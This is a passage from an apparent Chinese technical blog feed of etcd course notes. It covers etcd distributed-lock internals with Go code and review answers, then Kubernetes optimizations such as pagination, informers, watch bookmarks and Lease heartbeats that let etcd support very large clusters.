class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cli</span>, <span class="hljs-keyword">err</span> := clientv3.New(clientv3.Config&#123;Endpoints: endpoints&#125;)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">err</span> != nil &#123;<br>   <span class="hljs-keyword">log</span>.Fatal(<span class="hljs-keyword">err</span>)<br>&#125;<br>defer <span class="hljs-keyword">cli</span>.<span class="hljs-keyword">Close</span>()<br><span class="hljs-comment">// create two separate sessions for lock competition</span><br>s1, <span class="hljs-keyword">err</span> := concurrency.NewSession(<span class="hljs-keyword">cli</span>, concurrency.WithTTL(10))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">err</span> != nil &#123;<br>   <span class="hljs-keyword">log</span>.Fatal(<span class="hljs-keyword">err</span>)<br>&#125;<br>defer s1.<span class="hljs-keyword">Close</span>()<br>m1 := concurrency.NewMutex(s1, <span class="hljs-string">&quot;/my-lock/&quot;</span>)<br><span class="hljs-comment">// acquire lock for s1</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">err</span> := m1.Lock(context.TODO()); <span class="hljs-keyword">err</span> != nil &#123;<br>   <span class="hljs-keyword">log</span>.Fatal(<span class="hljs-keyword">err</span>)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;acquired lock for s1&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">err</span> := m1.Unlock(context.TODO()); <span class="hljs-keyword">err</span> != nil &#123;<br>   <span class="hljs-keyword">log</span>.Fatal(<span class="hljs-keyword">err</span>)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;released lock for s1&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>那么mutex对象的Lock方法是如何加锁的呢？</p><p>核心还是使用了上面介绍的事务和Lease特性，当CreateRevision为0时，它会创建一个prefix为&#x2F;my-lock的key（ &#x2F;my-lock + LeaseID)，并获取到&#x2F;my-lock prefix下面最早创建的一个key（revision最小），分布式锁最终是由写入此key的client获得，其他client则进入等待模式。</p><p>详细代码如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">m<span class="hljs-selector-class">.myKey</span> = fmt<span class="hljs-selector-class">.Sprintf</span>(<span class="hljs-string">&quot;%s%x&quot;</span>, m<span class="hljs-selector-class">.pfx</span>, s<span class="hljs-selector-class">.Lease</span>())<br>cmp := v3<span class="hljs-selector-class">.Compare</span>(v3<span class="hljs-selector-class">.CreateRevision</span>(m.myKey), <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0</span>)<br><span class="hljs-comment">// put self in lock waiters via myKey; oldest waiter holds lock</span><br>put := v3<span class="hljs-selector-class">.OpPut</span>(m<span class="hljs-selector-class">.myKey</span>, <span class="hljs-string">&quot;&quot;</span>, v3<span class="hljs-selector-class">.WithLease</span>(s<span class="hljs-selector-class">.Lease</span>()))<br><span class="hljs-comment">// reuse key in case this session already holds the lock</span><br>get := v3<span class="hljs-selector-class">.OpGet</span>(m.myKey)<br><span class="hljs-comment">// fetch current holder to complete uncontended path with only one RPC</span><br>getOwner := v3<span class="hljs-selector-class">.OpGet</span>(m<span class="hljs-selector-class">.pfx</span>, v3<span class="hljs-selector-class">.WithFirstCreate</span>()...)<br>resp, err := client<span class="hljs-selector-class">.Txn</span>(ctx)<span class="hljs-selector-class">.If</span>(cmp)<span class="hljs-selector-class">.Then</span>(put, getOwner)<span class="hljs-selector-class">.Else</span>(get, getOwner)<span class="hljs-selector-class">.Commit</span>()<br><span class="hljs-keyword">if</span> err != nil &#123;<br>   return err<br>&#125;<br><br></code></pre></td></tr></table></figure><p>那未获得锁的client是如何等待的呢?</p><p>答案是通过Watch机制各自监听prefix相同，revision比自己小的key，因为只有revision比自己小的key释放锁，才能有机会获得锁，如下代码所示，其中waitDelete会使用上面的介绍的Watch去监听比自己小的key，详细代码可参考 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/clientv3/concurrency/mutex.go">concurrency mutex</a> 的实现。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// wait for deletion revisions prior to myKey</span><br>hdr, werr := <span class="hljs-built_in">waitDeletes</span>(ctx, client, m<span class="hljs-selector-class">.pfx</span>, m.myRev-<span class="hljs-number">1</span>)<br><span class="hljs-comment">// release lock key if wait failed</span><br><span class="hljs-keyword">if</span> werr != nil &#123;<br>   m<span class="hljs-selector-class">.Unlock</span>(client<span class="hljs-selector-class">.Ctx</span>())<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>   m<span class="hljs-selector-class">.hdr</span> = hdr<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>首先通过一个Redis分布式锁实现问题——茅台超卖案例，介绍了分布式锁的三个主要核心要素，它们分别如下：</p><ul><li>安全性、互斥性。在同一时间内，不允许多个client同时获得锁。</li><li>活性。无论client出现crash还是遭遇网络分区，都需要确保任意故障场景下，都不会出现死锁，常用的解决方案是超时和自动过期机制。</li><li>高可用、高性能。加锁、释放锁的过程性能开销要尽量低，同时要保证高可用，避免单点故障。</li></ul><p>随后通过这个案例，继续分析了Redis SET命令创建分布式锁的安全性问题。单Redis Master节点存在单点故障，一主多备Redis实例又因为Redis主备异步复制，当Master节点发生crash时，可能会导致同时多个client持有分布式锁，违反了锁的安全性问题。</p><p>为了优化以上问题，Redis作者提出了<strong>RedLock</strong>分布式锁，它基于多个独立的Redis Master节点工作，只要一半以上节点存活就能正常工作，同时不依赖Redis主备异步复制，具有良好的安全性、高可用性。然而它的实现依赖于系统时间，当发生时钟跳变的时候，也会出现安全性问题。</p><p>最后重点介绍了etcd的分布式锁实现过程中的一些技术点。它通过etcd事务机制，校验CreateRevision为0才能写入相关key。若多个client同时申请锁，则client通过比较各个key的revision大小，判断是否获得锁，确保了锁的安全性、互斥性。通过Lease机制确保了锁的活性，无论client发生crash还是网络分区，都能保证不会出现死锁。通过Watch机制使其他client能快速感知到原client持有的锁已释放，提升了锁的可用性。最重要的是etcd是基于Raft协议实现的高可靠、强一致存储，正常情况下，不存在Redis主备异步复制协议导致的数据丢失问题。</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>这节课到这里也就结束了，最后我给你留了两个思考题。</p><p>第一，死锁、脑裂、惊群效应是分布式锁的核心问题，你知道它们各自是怎么一回事吗？ZooKeeper和etcd是如何应对这些问题的呢？</p><p>死锁：加锁后由于没有添加锁的过期时间或者锁的时间设置过长，服务异常crash或者服务执行后漏执行释放锁操作，导致锁长时间没有释放</p><p>脑裂：分布式体系结构中的集中式结构（也称为 Master&#x2F;Slave 架构），一个Master节点多个Slave节点，所有的请求数据处理必须先经过Master中央服务器，由Master统一进行资源和任务调度，中央服务器根据这些信息，将任务下达给节点服务器，节点服务器执行任务，并将结果反馈给中央服务器。脑裂是在某些特殊条件下，如主备切换，Slave在与Master的网络出现故障的时候，Slave会认为Master已经故障，从而成为新的master，而原来的master也没有卸任，从而导致存在两个Master在对外服务，存在多master会导致共享资源的互斥性遭到破坏，出现资源争抢，数据不一致等问题 </p><p>惊群效应：指多进程（多线程）在同时阻塞等待同一个事件的时候（休眠状态），如果等待的这个事件发生，那么他就会唤醒等待的所有进程（或者线程），但是最终却只能有一个进程（线程）获得这个时间的“控制权”，对该事件进行处理，而其他进程（线程）获取“控制权”失败，只能重新进入休眠状态，这种现象和性能浪费就叫做惊群效应。（当你往一群鸽子中间扔一块食物，虽然最终只有一个鸽子抢到食物，但所有鸽子都会被惊动来争夺，没有抢到食物的鸽子只好回去继续睡觉， 等待下一块食物到来。这样，每扔一块食物，都会惊动所有的鸽子，即为惊群。） </p><p>etcd如何避免死锁：利用Lease的活性检测机制，它提供了检测各个客户端存活的能力。你的业务 client 需定期向 etcd 服务发送”特殊心跳”汇报健康状态，若你未正常发送心跳，并超过和 etcd 服务约定的最大存活时间后，就会被 etcd 服务移除此 Lease 和其关联的数据。通过 Lease 机制就优雅地解决了 client 出现 crash 故障、client 与 etcd 集群网络出现隔离等各类故障场景下的死锁问题。一旦超过 Lease TTL，它就能自动被释放，确保了其他 client 在 TTL 过期后能正常申请锁，保障了业务的可用性。 </p><p>etcd如何避免集群脑裂：在leader选举上采用了过半机制，即得到一半以上的follow才能成为leader，且新leader就任后旧leader必须卸任，所以etcd不存在脑裂问题 </p><p>etcd如何避免惊群效应：mutex，通过 Watch 机制各自监听 prefix 相同，revision 比自己小的 key，因为只有 revision 比自己小的 key 释放锁，才能有机会，获得锁</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>20.Kubernetes高级应用：如何优化业务场景使etcd能支撑上万节点集群？</title>
    <link href="/2022/10/15/20-Kubernetes%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E4%BD%BFetcd%E8%83%BD%E6%94%AF%E6%92%91%E4%B8%8A%E4%B8%87%E8%8A%82%E7%82%B9%E9%9B%86%E7%BE%A4%EF%BC%9F/"/>
    <url>/2022/10/15/20-Kubernetes%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E4%BD%BFetcd%E8%83%BD%E6%94%AF%E6%92%91%E4%B8%8A%E4%B8%87%E8%8A%82%E7%82%B9%E9%9B%86%E7%BE%A4%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="20-Kubernetes高级应用：如何优化业务场景使etcd能支撑上万节点集群？"><a href="#20-Kubernetes高级应用：如何优化业务场景使etcd能支撑上万节点集群？" class="headerlink" title="20.Kubernetes高级应用：如何优化业务场景使etcd能支撑上万节点集群？"></a>20.Kubernetes高级应用：如何优化业务场景使etcd能支撑上万节点集群？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>Kubernetes社区官网文档目前声称支持最大集群节点数为5000，但是云厂商已经号称支持15000节点的Kubernetes集群了，那么为什么一个小小的etcd能支撑15000节点Kubernetes集群呢？</p><p>今天聊聊为了支撑15000节点，Kubernetes和etcd的做的一系列优化。将重点分析Kubernetes针对etcd的瓶颈是如何从应用层采取一系列优化措施，去解决大规模集群场景中各个痛点。</p><h2 id="大集群核心问题分析"><a href="#大集群核心问题分析" class="headerlink" title="大集群核心问题分析"></a>大集群核心问题分析</h2><p>在大规模Kubernetes集群中会遇到哪些问题呢？</p><p>大规模Kubernetes集群的外在表现是节点数成千上万，资源对象数量高达几十万。本质是更频繁地查询、写入更大的资源对象。</p><p>首先是查询相关问题。在大集群中最重要的就是如何最大程度地减少<strong>expensive reques</strong>t。因为对几十万级别的对象数量来说，按标签、namespace查询Pod，获取所有Node等场景时，很容易造成etcd和kube-apiserver OOM和丢包，乃至雪崩等问题发生。</p><p>其次是写入相关问题。Kubernetes为了维持上万节点的心跳，会产生大量写请求。而按照之前介绍的etcd MVCC、boltdb、线性读等原理，etcd适用场景是读多写少，大量写请求可能会导致db size持续增长、写性能达到瓶颈被限速、影响读性能。</p><p>最后是大资源对象相关问题。etcd适合存储较小的key-value数据，etcd本身也做了一系列硬限制，比如key的value大小默认不能超过1.5MB。</p><p>本讲我就和你重点分析下Kubernetes是如何优化以上问题，以实现支撑上万节点的。以及我会简单和你讲下etcd针对Kubernetes场景做了哪些优化。</p><h2 id="如何减少expensive-request"><a href="#如何减少expensive-request" class="headerlink" title="如何减少expensive request"></a>如何减少expensive request</h2><p>首先是第一个问题，Kubernetes如何减少expensive request？</p><p>在这个问题中，我将Kubernetes解决此问题的方案拆分成几个核心点和你分析。</p><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>首先List资源操作是个基本功能点。各个组件在启动的时候，都不可避免会产生List操作，从etcd获取集群资源数据，构建初始状态。因此优化的第一步就是要避免一次性读取数十万的资源操作。</p><p>解决方案是Kubernetes List接口支持分页特性。分页特性依赖底层存储支持，早期的etcd v2并未支持分页被饱受诟病，非常容易出现kube-apiserver大流量、高负载等问题。在etcd v3中，实现了指定返回Limit数量的范围查询，因此也赋能kube-apiserver 对外提供了分页能力。</p><p>如下所示，在List接口的ListOption结构体中，Limit和Continue参数就是为了实现分页特性而增加的。</p><p>Limit表示一次List请求最多查询的对象数量，一般为500。如果实际对象数量大于Limit，kube-apiserver则会更新ListMeta的Continue字段，client发起的下一个List请求带上这个字段就可获取下一批对象数量。直到kube-apiserver返回空的Continue值，就获取完成了整个对象结果集。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// ListOptions is the query options to a standard REST</span><br><span class="hljs-built_in">list</span> call.<br><span class="hljs-keyword">type</span> ListOptions <span class="hljs-keyword">struct</span> &#123;<span class="hljs-operator"></span><br><span class="hljs-operator">   ...</span><br><span class="hljs-operator">   </span>Limit <span class="hljs-built_in">int64</span> `json:<span class="hljs-string">&quot;limit,omitempty&quot;</span><br>protobuf:<span class="hljs-string">&quot;varint,7,opt,name=limit&quot;</span>`<br>   Continue <span class="hljs-built_in">string</span> `json:<span class="hljs-string">&quot;continue,omitempty&quot;</span><br>protobuf:<span class="hljs-string">&quot;bytes,8,opt,name=continue&quot;</span>`<br>&#125;<br><br></code></pre></td></tr></table></figure><p>了解完kube-apiserver的分页特性后，我们接着往下看Continue字段具体含义，以及它是如何影响etcd查询结果的。</p><p>我们知道etcd分页是通过范围查询和Limit实现，ListOption中的Limit对应etcd查询接口中的Limit参数。你可以大胆猜测下，Continue字段是不是跟查询的范围起始key相关呢？</p><p>Continue字段的确包含查询范围的起始key，它本质上是个结构体，还包含APIVersion和ResourceVersion。你之所以看到的是一个奇怪字符串，那是因为kube-apiserver使用base64库对其进行了URL编码，下面是它的原始结构体。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> continueToken <span class="hljs-keyword">struct</span> &#123;<br>   APIVersion      <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;v&quot;`</span><br>   ResourceVersion <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;rv&quot;`</span><br>   StartKey        <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;start&quot;`</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>当kube-apiserver收到带Continue的分页查询时，解析Continue，获取StartKey、ResourceVersion，etcd查询Range接口指定startKey，增加clienv3.WithRange、clientv3.WithLimit、clientv3.WithRev即可。</p><h3 id="资源按namespace拆分"><a href="#资源按namespace拆分" class="headerlink" title="资源按namespace拆分"></a>资源按namespace拆分</h3><p>通过分页特性提供机制避免一次拉取大量资源对象后，接下来就是业务最佳实践上要避免同namespace存储大量资源，尽量将资源对象拆分到不同namespace下。</p><p>为什么拆分到不同namespace下有助于提升性能呢?</p><p>Kubernetes资源对象存储在etcd中的key前缀包含namespace，因此它相当于是个高效的索引字段。etcd treeIndex模块从B-tree中匹配前缀时，可快速过滤出符合条件的key-value数据。</p><p>Kubernetes社区承诺 <a href="https://github.com/kubernetes/community/blob/master/sig-scalability/slos/slos.md">SLO</a> 达标的前提是，你在使用Kubernetes集群过程中必须合理配置集群和使用扩展特性，并遵循 <a href="https://github.com/kubernetes/community/blob/master/sig-scalability/configs-and-limits/thresholds.md">一系列条件限制</a>（比如同namespace下的Service数量不超过5000个）。</p><h3 id="Informer机制"><a href="#Informer机制" class="headerlink" title="Informer机制"></a>Informer机制</h3><p>各组件启动发起一轮List操作加载完初始状态数据后，就进入了控制器的一致性协调逻辑。在一致性协调逻辑中，Kubernetes使用的是Watch特性来获取数据变化通知，而不是List定时轮询，这也是减少List操作一大核心策略。</p><p>Kubernetes社区在client-go项目中提供了一个通用的Informer组件来负责client与kube-apiserver进行资源和事件同步，显著降低了开发者使用Kubernetes API、开发高性能Kubernetes扩展组件的复杂度。</p><p>Informer机制的Reflector封装了Watch、List操作，结合本地Cache、Indexer，实现了控制器加载完初始状态数据后，接下来的其他操作都只需要从本地缓存读取，极大降低了kube-apiserver和etcd的压力。</p><p>下面是Kubernetes社区给出的一个控制器使用Informer机制的架构图。黄色部分是控制器相关基础组件，蓝色部分是client-go的Informer机制的组件，它由Reflector、Queue、Informer、Indexer、Thread safe store(Local Cache)组成。</p><p><img src="https://static001.geekbang.org/resource/image/fb/99/fb7caaa37a6a860422825d2199217899.png?wh=1058*794" alt="img"></p><p>Informer机制的基本工作流程如下：</p><ul><li>client启动或与kube-apiserver出现连接中断再次Watch时，报”too old resource version”等错误后，通过Reflector组件的List操作，从kube-apiserver获取初始状态数据，随后通过Watch机制实时监听数据变化。</li><li>收到事件后添加到Delta FIFO队列，由Informer组件进行处理。</li><li>Informer将delta FIFO队列中的事件转发给Indexer组件，Indexer组件将事件持久化存储在本地的缓存中。</li><li>控制器开发者可通过Informer组件注册Add、Update、Delete事件的回调函数。Informer组件收到事件后会回调业务函数，比如典型的控制器使用场景，一般是将各个事件添加到WorkQueue中，控制器的各个协调goroutine从队列取出消息，解析key，通过key从Informer机制维护的本地Cache中读取数据。</li></ul><p>通过以上流程分析，你可以发现除了启动、连接中断等场景才会触发List操作，其他时候都是从本地Cache读取。</p><p><strong>那连接中断等场景为什么触发client List操作呢？</strong></p><h3 id="Watch-bookmark机制"><a href="#Watch-bookmark机制" class="headerlink" title="Watch bookmark机制"></a>Watch bookmark机制</h3><p>要搞懂这个问题，你得了解kube-apiserver Watch特性的原理。</p><p>接下来介绍下Kubernetes的Watch特性。我们知道Kubernetes通过全局递增的Resource Version来实现增量数据同步逻辑，尽量避免连接中断等异常场景下client发起全量List同步操作。</p><p>那么在什么场景下会触发全量List同步操作呢？这就取决于client请求的Resource Version以及kube-apiserver中是否还保存了相关的历史版本数据。</p><p>在 Watch特性中，提到实现历史版本数据存储两大核心机制，滑动窗口和MVCC。与etcd v3使用MVCC机制不一样的是，Kubernetes采用的是滑动窗口机制。</p><p>kube-apiserver的滑动窗口机制是如何实现的呢?</p><p>它通过为每个类型资源（Pod,Node等）维护一个cyclic buffer，来存储最近的一系列变更事件实现。</p><p>下面Kubernetes核心的watchCache结构体中的cache数组、startIndex、endIndex就是用来实现cyclic buffer的。滑动窗口中的第一个元素就是cache[startIndex%capacity]，最后一个元素则是cache[endIndex%capacity]。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// watchCache is a &quot;sliding window&quot; (with a limited capacity) of objects</span><br><span class="hljs-comment">// observed from a watch.</span><br><span class="hljs-keyword">type</span> watchCache <span class="hljs-keyword">struct</span> &#123;<br>   sync.RWMutex<br><br>   <span class="hljs-comment">// Condition on which lists are waiting for the fresh enough</span><br>   <span class="hljs-comment">// resource version.</span><br>   cond *sync.Cond<br><br>   <span class="hljs-comment">// Maximum size of history window.</span><br>   capacity <span class="hljs-type">int</span><br><br>   <span class="hljs-comment">// upper bound of capacity since event cache has a dynamic size.</span><br>   upperBoundCapacity <span class="hljs-type">int</span><br><br>   <span class="hljs-comment">// lower bound of capacity since event cache has a dynamic size.</span><br>   lowerBoundCapacity <span class="hljs-type">int</span><br><br>   <span class="hljs-comment">// cache is used a cyclic buffer - its first element (with the smallest</span><br>   <span class="hljs-comment">// resourceVersion) is defined by startIndex, its last element is defined</span><br>   <span class="hljs-comment">// by endIndex (if cache is full it will be startIndex + capacity).</span><br>   <span class="hljs-comment">// Both startIndex and endIndex can be greater than buffer capacity -</span><br>   <span class="hljs-comment">// you should always apply modulo capacity to get an index in cache array.</span><br>   cache      []*watchCacheEvent<br>   startIndex <span class="hljs-type">int</span><br>   endIndex   <span class="hljs-type">int</span><br><br>   <span class="hljs-comment">// store will effectively support LIST operation from the &quot;end of cache</span><br>   <span class="hljs-comment">// history&quot; i.e. from the moment just after the newest cached watched event.</span><br>   <span class="hljs-comment">// It is necessary to effectively allow clients to start watching at now.</span><br>   <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> We assume that &lt;store&gt; is thread-safe.</span><br>   store cache.Indexer<br><br>   <span class="hljs-comment">// ResourceVersion up to which the watchCache is propagated.</span><br>   resourceVersion <span class="hljs-type">uint64</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面以Pod资源的历史事件滑动窗口为例，聊聊它在什么场景可能会触发client全量List同步操作。</p><p>如下图所示，kube-apiserver启动后，通过List机制，加载初始Pod状态数据，随后通过Watch机制监听最新Pod数据变化。当你不断对Pod资源进行增加、删除、修改后，携带新Resource Version（简称RV）的Pod事件就会不断被加入到cyclic buffer。假设cyclic buffer容量为100，RV1是最小的一个Watch事件的Resource Version，RV 100是最大的一个Watch事件的Resource Version。</p><p>当版本号为RV101的Pod事件到达时，RV1就会被淘汰，kube-apiserver维护的Pod最小版本号就变成了RV2。然而在Kubernetes集群中，不少组件都只关心cyclic buffer中与自己相关的事件。</p><p><img src="/images/348633/29deb02b3724edef274ce71d6a758b29.png"></p><p>比如图中的kubelet只关注运行在自己节点上的Pod，假设只有RV1是它关心的Pod事件版本号，在未实现Watch bookmark特性之前，其他RV2到RV101的事件是不会推送给它的，因此它内存中维护的Resource Version依然是RV1。</p><p>若此kubelet随后与kube-apiserver连接出现异常，它将使用版本号RV1发起Watch重连操作。但是kube-apsierver cyclic buffer中的Pod最小版本号已是RV2，因此会返回”too old resource version”错误给client，client只能发起List操作，在获取到最新版本号后，才能重新进入监听逻辑。</p><p><strong>那么能否定时将最新的版本号推送给各个client来解决以上问题呢?</strong></p><p>是的，这就是Kubernetes的Watch bookmark机制核心思想。即使队列中无client关注的更新事件，Informer机制的Reflector组件中Resource Version也需要更新。</p><p>Watch bookmark机制通过新增一个bookmark类型的事件来实现的。kube-apiserver会通过定时器将各类型资源最新的Resource Version推送给kubelet等client，在client与kube-apiserver网络异常重连等场景，大大降低了client重建Watch的开销，减少了relist expensive request。</p><h3 id="更高效的Watch恢复机制"><a href="#更高效的Watch恢复机制" class="headerlink" title="更高效的Watch恢复机制"></a>更高效的Watch恢复机制</h3><p>虽然Kubernetes社区通过Watch bookmark机制缓解了client与kube-apiserver重连等场景下可能导致的relist expensive request操作，然而在kube-apiserver重启、滚动更新时，它依然还是有可能导致大量的relist操作，这是为什么呢？ 如何进一步减少kube-apiserver重启场景下的List操作呢？</p><p>如下图所示，在kube-apiserver重启后，kubelet等client会立刻带上Resource Version发起重建Watch的请求。问题就在kube-apiserver重启后，watchCache中的cyclic buffer是空的，此时watchCache中的最小Resource Version(listResourceVersion)是etcd的最新全局版本号，也就是图中的RV200。</p><p><img src="/images/348633/e1694c3dce75b310b9950f3e3yydd2d2.png"></p><p>在不少场景下，client请求重建Watch的Resource Version是可能小于listResourceVersion的。</p><p>比如在上面的这个案例图中，集群内Pod稳定运行未发生变化，kubelet假设收到了最新的RV100事件。然而这个集群其他资源如ConfigMap，被管理员不断的修改，它就会导致导致etcd版本号新增，ConfigMap滑动窗口也会不断存储变更事件，从图中可以看到，它记录最大版本号为RV200。</p><p>因此kube-apiserver重启后，client请求重建Pod Watch的Resource Version是RV100，而Pod watchCache中的滑动窗口最小Resource Version是RV200。很显然，RV100不在Pod watchCache所维护的滑动窗口中，kube-apiserver就会返回”too old resource version”错误给client，client只能发起relist expensive request操作同步最新数据。</p><p>为了进一步降低kube-apiserver重启对client Watch中断的影响，Kubernetes在1.20版本中又进一步实现了 <a href="https://github.com/kubernetes/enhancements/tree/master/keps/sig-api-machinery/1904-efficient-watch-resumption">更高效的Watch恢复机制</a>。它通过etcd Watch机制的<strong>Notify</strong>特性，实现了将etcd最新的版本号定时推送给kube-apiserver。kube-apiserver在将其转换成ResourceVersion后，再通过bookmark机制推送给client，避免了kube-apiserver重启后client可能发起的List操作。</p><h2 id="如何控制db-size"><a href="#如何控制db-size" class="headerlink" title="如何控制db size"></a>如何控制db size</h2><p>分析完Kubernetes如何减少expensive request，再看看Kubernetes是如何控制db size的。</p><p>首先，Kubernetes的kubelet组件会每隔10秒上报一次心跳给kube-apiserver。</p><p>其次，Node资源对象因为包含若干个镜像、数据卷等信息，导致Node资源对象会较大，一次心跳消息可能高达15KB以上。</p><p>最后，etcd是基于COW(Copy-on-write)机制实现的MVCC数据库，每次修改都会产生新的key-value，若大量写入会导致db size持续增长。</p><p>早期Kubernetes集群由于以上原因，当节点数成千上万时，kubelet产生的大量写请求就较容易造成db大小达到配额，无法写入。</p><p>那么如何解决呢？</p><p>本质上还是Node资源对象大的问题。实际上我们需要更新的仅仅是Node资源对象的心跳状态，而在etcd中我们存储的是整个Node资源对象，并未将心跳状态拆分出来。</p><p>因此Kuberentes的解决方案就是将Node资源进行拆分，把心跳状态信息从Node对象中剥离出来，通过下面的Lease对象来描述它。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// Lease defines a lease concept.<br><span class="hljs-keyword">type</span> Lease struct &#123;<br>   metav1.TypeMeta `<span class="hljs-type">json</span>:&quot;,inline&quot;`<br>   metav1.ObjectMeta `<span class="hljs-type">json</span>:&quot;metadata,omitempty&quot; protobuf:&quot;bytes,1,opt,name=metadata&quot;`<br>   Spec LeaseSpec `<span class="hljs-type">json</span>:&quot;spec,omitempty&quot; protobuf:&quot;bytes,2,opt,name=spec&quot;`<br>&#125;<br><br>// LeaseSpec <span class="hljs-keyword">is</span> a specification <span class="hljs-keyword">of</span> a Lease.<br><span class="hljs-keyword">type</span> LeaseSpec struct &#123;<br>   HolderIdentity *string `<span class="hljs-type">json</span>:&quot;holderIdentity,omitempty&quot; protobuf:&quot;bytes,1,opt,name=holderIdentity&quot;`<br>   LeaseDurationSeconds *int32 `<span class="hljs-type">json</span>:&quot;leaseDurationSeconds,omitempty&quot; protobuf:&quot;varint,2,opt,name=leaseDurationSeconds&quot;`<br>   AcquireTime *metav1.MicroTime `<span class="hljs-type">json</span>:&quot;acquireTime,omitempty&quot; protobuf:&quot;bytes,3,opt,name=acquireTime&quot;`<br>   RenewTime *metav1.MicroTime `<span class="hljs-type">json</span>:&quot;renewTime,omitempty&quot; protobuf:&quot;bytes,4,opt,name=renewTime&quot;`<br>   LeaseTransitions *int32 `<span class="hljs-type">json</span>:&quot;leaseTransitions,omitempty&quot; protobuf:&quot;varint,5,opt,name=leaseTransitions&quot;`<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因为<strong>Lease对象非常小，更新的代价远小于Node对象</strong>，所以这样显著降低了kube-apiserver的CPU开销、etcd db size，Kubernetes 1.14版本后已经默认启用Node心跳切换到Lease API。</p><h2 id="如何优化key-value大小"><a href="#如何优化key-value大小" class="headerlink" title="如何优化key-value大小"></a>如何优化key-value大小</h2><p>最后，再看看Kubernetes是如何解决etcd 